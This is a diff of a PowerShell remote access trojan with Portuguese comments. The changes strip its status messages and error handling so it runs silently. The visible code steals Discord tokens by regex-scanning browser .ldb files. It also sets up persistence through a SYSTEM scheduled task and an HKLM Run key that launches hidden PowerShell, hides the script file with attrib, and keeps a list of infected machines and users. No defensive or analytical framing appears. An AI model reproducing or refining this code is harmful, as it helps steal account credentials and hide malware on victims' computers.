@@ -48,39 +48,24 @@ function Remove-UserFromRAT {
         $removido = $false
         
         # 1. Remove do registro
-        try {
-            if (Test-Path $registryPath) {
-                Remove-Item -Path $registryPath -Recurse -Force
-                Write-Host "[✓] Registro removido" -ForegroundColor Green
-                $removido = $true
-            }
-        } catch {
-            Write-Host "[!] Erro ao remover registro" -ForegroundColor Red
+        if (Test-Path $registryPath) {
+            Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue
+            $removido = $true
         }
         
         # 2. Remove da lista de usuários
-        try {
-            if (Test-Path $userListFile) {
-                $users = Get-Content $userListFile -ErrorAction SilentlyContinue
-                $newUsers = $users | Where-Object { $_ -ne $UserName }
-                $newUsers | Set-Content $userListFile -Force
-                Write-Host "[✓] Usuário removido da lista" -ForegroundColor Green
-                $removido = $true
-            }
-        } catch {
-            Write-Host "[!] Erro ao remover da lista" -ForegroundColor Red
+        if (Test-Path $userListFile) {
+            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
+            $newUsers = $users | Where-Object { $_ -ne $UserName }
+            $newUsers | Set-Content $userListFile -Force
+            $removido = $true
         }
         
         # 3. Remove tarefas agendadas
-        try {
-            $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
-            foreach ($task in $tasks) {
-                Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
-                Write-Host "[✓] Tarefa agendada removida: $($task.TaskName)" -ForegroundColor Green
-                $removido = $true
-            }
-        } catch {
-            Write-Host "[!] Erro ao remover tarefas" -ForegroundColor Red
+        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
+        foreach ($task in $tasks) {
+            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+            $removido = $true
         }
         
         if ($removido) {
@@ -89,7 +74,6 @@ function Remove-UserFromRAT {
             return "USUARIO_NAO_ENCONTRADO"
         }
     } catch {
-        Write-Host "[!] Erro geral: $_" -ForegroundColor Red
         return "ERRO_AO_REMOVER"
     }
 }
@@ -109,7 +93,6 @@ function Get-RATUsers {
         
         return "USUARIOS:" + ($users -join "`n")
     } catch {
-        Write-Host "[!] Erro ao listar usuários: $_" -ForegroundColor Red
         return "ERRO_AO_LISTAR"
     }
 }
@@ -128,7 +111,6 @@ function Add-UserToList {
         
         return $true
     } catch {
-        Write-Host "[!] Erro ao adicionar usuário: $_" -ForegroundColor Red
         return $false
     }
 }
@@ -137,21 +119,15 @@ function Add-UserToList {
 $currentUser = "$env:COMPUTERNAME@$env:USERNAME"
 $userExecuted = $false
 
-try {
-    if (Test-Path $userListFile) {
-        $users = Get-Content $userListFile -ErrorAction SilentlyContinue
-        if ($users -contains $currentUser) {
-            $userExecuted = $true
-            Write-Host "[i] Usuário $currentUser já executou o RAT anteriormente" -ForegroundColor Yellow
-        }
+if (Test-Path $userListFile) {
+    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
+    if ($users -contains $currentUser) {
+        $userExecuted = $true
     }
-} catch {
-    Write-Host "[!] Erro ao verificar usuário: $_" -ForegroundColor Red
 }
 
 if (-not $userExecuted) {
     Add-UserToList $currentUser
-    Write-Host "[+] Novo usuário adicionado: $currentUser" -ForegroundColor Green
 }
 
 # ===== ELEVAR PRIVILEGIOS =====
@@ -343,15 +319,11 @@ function Get-DiscordToken {
         foreach ($path in $paths) {
             if (Test-Path $path) {
                 Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
-                    try {
-                        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                        $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
-                        $matches = $regex.Matches($content)
-                        foreach ($match in $matches) {
-                            $tokens += $match.Value
-                        }
-                    } catch {
-                        Write-Host "[!] Erro ao ler arquivo de token" -ForegroundColor Red
+                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
+                    $matches = $regex.Matches($content)
+                    foreach ($match in $matches) {
+                        $tokens += $match.Value
                     }
                 }
             }
@@ -666,14 +638,14 @@ function Install-Persistence {
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
     } catch {
-        Write-Host "[!] Erro ao criar tarefa agendada" -ForegroundColor Red
+        # Silently continue
     }
     
     try {
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
     } catch {
-        Write-Host "[!] Erro ao criar registro" -ForegroundColor Red
+        # Silently continue
     }
     
     attrib +h +s +r $scriptPath
